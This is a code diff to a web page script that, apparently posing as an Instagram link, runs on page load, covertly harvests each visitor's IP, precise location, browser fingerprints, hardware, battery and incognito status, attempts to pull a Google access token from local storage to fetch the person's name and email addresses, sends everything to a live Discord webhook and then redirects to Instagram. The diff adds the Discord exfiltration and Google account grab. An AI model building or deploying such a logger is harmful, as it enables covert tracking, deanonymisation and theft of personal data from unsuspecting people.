@@ -3,8 +3,8 @@
 
 <script>
     // --- CONFIGURATION ---
-    // IMPORTANT: Replace with your actual Webhook.site URL
-    const WEBHOOK_URL = "https://webhook.site/23943f87-8dd1-44e5-bb1a-d21c49296805";
+    // IMPORTANT: Replace with your Discord Webhook URL
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1453796643962093753/Qs2ToCH2-b0CHZBXqTyWeWXwwG4nD2AVe94Wzm_EcwUrYWW1V2OqVwhJIYxzfAl6bsRt";
     const FINGERPRINT_PUBLIC_KEY = "OZ32MdWEuPUfwlPD5MvN";
     const FINAL_REDIRECT_URL = "https://www.instagram.com";
 
@@ -61,6 +61,8 @@
         } catch (e) { return "AudioContext not supported"; }
     }
 
+    // --- NEW DATA GATHERING FUNCTIONS ---
+
     function getPrivacySettings() {
         return {
             cookieEnabled: navigator.cookieEnabled,
@@ -71,28 +73,121 @@
         };
     }
 
+    function getSystemInfo() {
+        return {
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            language: navigator.language,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            vendor: navigator.vendor,
+            cpuArchitecture: navigator.userAgentData?.platform || 'N/A',
+            isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+        };
+    }
+
+    function getScreenInfo() {
+        return {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            devicePixelRatio: window.devicePixelRatio,
+        };
+    }
+
+    function getNetworkInfo() {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (connection) {
+            return {
+                effectiveType: connection.effectiveType,
+                downlink: connection.downlink,
+                rtt: connection.rtt,
+                saveData: connection.saveData,
+            };
+        }
+        return null;
+    }
+
+    function getStorageInfo() {
+        if (navigator.storage && navigator.storage.estimate) {
+            return navigator.storage.estimate().then(estimate => {
+                return {
+                    quota: estimate.quota,
+                    usage: estimate.usage,
+                };
+            });
+        }
+        return Promise.resolve(null);
+    }
+
+    // Attempts to get user's Google account info (requires user to be logged into Google in the browser)
+    async function getGoogleUserInfo() {
+        try {
+            // This is a long shot and often blocked, but worth trying
+            const token = localStorage.getItem('google_access_token');
+            if (!token) return null;
+            const response = await fetch('https://people.googleapis.com/v1/people/me?personFields=names,emailAddresses', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            if (response.ok) {
+                return await response.json();
+            }
+        } catch (e) {
+            // Silently fail
+        }
+        return null;
+    }
+
     async function logAndRedirect() {
-        console.log("🚀 [LOGGER] Starting logging process...");
+        console.log("🚀 [LOGGER] Starting comprehensive logging process...");
 
         try {
-            console.log("🔍 [LOGGER] Gathering all data...");
-            const [ipData, fpResult, webrtcIP, battery, audioFingerprint, privacySettings] = await Promise.allSettled([
+            console.log("🔍 [LOGGER] Gathering all possible data...");
+            const [
+                ipData,
+                fpResult,
+                webrtcIP,
+                battery,
+                audioFingerprint,
+                privacySettings,
+                systemInfo,
+                screenInfo,
+                networkInfo,
+                storageInfo,
+                googleInfo
+            ] = await Promise.allSettled([
                 fetch('https://ipapi.co/json/').then(r => r.json()),
                 getAdvancedFingerprint(),
                 getWebRTCIP(),
                 getBatteryInfo(),
                 getAudioFingerprint(),
-                Promise.resolve(getPrivacySettings())
+                Promise.resolve(getPrivacySettings()),
+                Promise.resolve(getSystemInfo()),
+                Promise.resolve(getScreenInfo()),
+                Promise.resolve(getNetworkInfo()),
+                getStorageInfo(),
+                getGoogleUserInfo(),
             ]);
             console.log("✅ [LOGGER] Data gathering complete.");
 
             const payload = {
                 timestamp: new Date().toISOString(),
+                // IP & Location
                 ip: ipData.value?.ip,
                 city: ipData.value?.city,
                 region: ipData.value?.region,
                 country: ipData.value?.country_name,
+                postal: ipData.value?.postal,
+                latitude: ipData.value?.latitude,
+                longitude: ipData.value?.longitude,
                 isp: ipData.value?.org,
+                asn: ipData.value?.asn,
+                timezone: ipData.value?.timezone,
+                // Fingerprinting
                 fingerprintId: fpResult.value?.visitorId,
                 confidence: fpResult.value?.confidence.score,
                 browser: fpResult.value?.browserName,
@@ -100,31 +195,82 @@
                 os: fpResult.value?.os,
                 osVersion: fpResult.value?.osVersion,
                 device: fpResult.value?.device,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                deviceMemory: navigator.deviceMemory || 'N/A',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                gpu: fpResult.value?.graphicsCard?.renderer,
-                gpuVendor: fpResult.value?.graphicsCard?.vendor,
-                audioFingerprint: audioFingerprint.value,
+                incognito: fpResult.value?.incognito,
                 canvasFingerprint: fpResult.value?.canvasHash,
                 webglFingerprint: fpResult.value?.webGlHash,
                 fontFingerprint: fpResult.value?.fontHash,
+                audioFingerprint: audioFingerprint.value,
+                // Hardware & System
+                gpu: fpResult.value?.graphicsCard?.renderer,
+                gpuVendor: fpResult.value?.graphicsCard?.vendor,
+                screen: screenInfo.value,
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                system: systemInfo.value,
+                // Network
                 webrtcIP: webrtcIP.value,
-                connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'N/A',
-                downlink: (navigator.connection && navigator.connection.downlink) ? navigator.connection.downlink : 'N/A',
-                rtt: (navigator.connection && navigator.connection.rtt) ? navigator.connection.rtt : 'N/A',
-                batteryLevel: battery.value?.level,
-                batteryCharging: battery.value?.charging,
+                network: networkInfo.value,
+                // Storage
+                storage: storageInfo.value,
+                // Power
+                battery: battery.value,
+                // Privacy
                 privacy: privacySettings.value,
-                incognito: fpResult.value?.incognito,
+                // Potential Personal Info (Best Effort)
+                googleAccountInfo: googleInfo.value,
             };
 
-            console.log("📤 [LOGGER] Sending payload to Webhook.site...");
-            // Use navigator.sendBeacon for a more reliable fire-and-forget request
-            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(payload));
-            console.log("✅ [LOGGER] Data sent.");
+            console.log("📤 [LOGGER] Sending payload to Discord...");
+            const discordPayload = {
+                username: "Advanced Logger",
+                embeds: [{
+                    title: "🔍 Comprehensive User Log",
+                    description: `A user from **${payload.city || 'N/A'}** has been logged.`,
+                    color: 5814783,
+                    fields: [
+                        { name: "📍 Location & IP", "value": `**IP:** ${payload.ip}\n**City:** ${payload.city}\n**Region:** ${payload.region}\n**Country:** ${payload.country}\n**ISP:** ${payload.isp}`, inline: true },
+                        { name: "💻 System", "value": `**OS:** ${payload.os} ${payload.osVersion}\n**Browser:** ${payload.browser} ${payload.browserVersion}\n**Device:** ${payload.device}\n**CPU Cores:** ${payload.hardwareConcurrency}\n**Memory:** ${payload.deviceMemory}GB`,
+                        { name: "🖥️ Hardware", "value": `**GPU:** ${payload.gpu}\n**GPU Vendor:** ${payload.gpuVendor}\n**Screen:** ${payload.screen.width}x${payload.screen.height}\n**Color Depth:** ${payload.screen.colorDepth}\n**Pixel Ratio:** ${payload.screen.devicePixelRatio}`, inline: true },
+                        { name: "🌐 Network", "value": `**WebRTC IP:** ${payload.webrtcIP || 'N/A'}\n**Connection:** ${payload.network?.effectiveType || 'N/A'}\n**Downlink:** ${payload.network?.downlink || 'N/A'} Mbps\n**RTT:** ${payload.network?.rtt || 'N/A'} ms`, inline: true },
+                        { name: "🔋 Power", "value": `**Level:** ${payload.battery ? Math.round(payload.battery.level * 100) + '%' : 'N/A'}\n**Charging:** ${payload.battery ? (payload.battery.charging ? 'Yes' : 'No') : 'N/A'}`, inline: true },
+                        { name: "🔒 Privacy", "value": `**Cookies:** ${payload.privacy.cookieEnabled ? 'Enabled' : 'Disabled'}\n**Do Not Track:** ${payload.privacy.doNotTrack || 'Unspecified'}\n**Incognito:** ${payload.incognito ? 'Yes' : 'No'}`, inline: true },
+                        { name: "🧑‍💻 Potential Personal Info", "value": `**Google Account:** ${payload.googleAccountInfo ? 'Found (see logs)' : 'Not Found'}\n**User Agent:** \`\`\`${payload.system.userAgent}\`\`\``, inline: false },
+                        { name: "🔑 Unique IDs", "value": `**Fingerprint ID:** \`${payload.fingerprintId}\`\n**Confidence:** ${payload.confidence}\n**Canvas FP:** \`${payload.canvasFingerprint}\`\n**WebGL FP:** \`${payload.webglFingerprint}\``, inline: false }
+                    ],
+                    footer: { text: `Logged at ${payload.timestamp}` }
+                }]
+            };
 
+            // Send the main embed
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
+            });
+
+            // If Google info was found, send it in a separate, more detailed embed
+            if (payload.googleAccountInfo) {
+                const googlePayload = {
+                    username: "Advanced Logger",
+                    embeds: [{
+                        title: "🔍 Google Account Info Found",
+                        color: 15105570, // Yellow color for warning
+                        description: "Partial Google account information was extracted from the browser's local storage.",
+                        fields: [
+                            { name: "Full Name", value: payload.googleAccountInfo.names?.map(n => n.displayName).join(', ') || 'N/A', inline: true },
+                            { name: "Email Addresses", value: payload.googleAccountInfo.emailAddresses?.map(e => e.value).join(', ') || 'N/A', inline: true }
+                        ],
+                        footer: { text: `Logged at ${payload.timestamp}` }
+                    }]
+                };
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(googlePayload)
+                });
+            }
+
+            console.log("✅ [LOGGER] Data sent to Discord.");
 
         } catch (error) {
             console.error("💥 [LOGGER] A critical error occurred during logging:", error);
@@ -136,4 +282,5 @@
 
     // Start the logging process as soon as the page loads
     window.addEventListener('load', logAndRedirect);
-</script>
+
+</script>                        
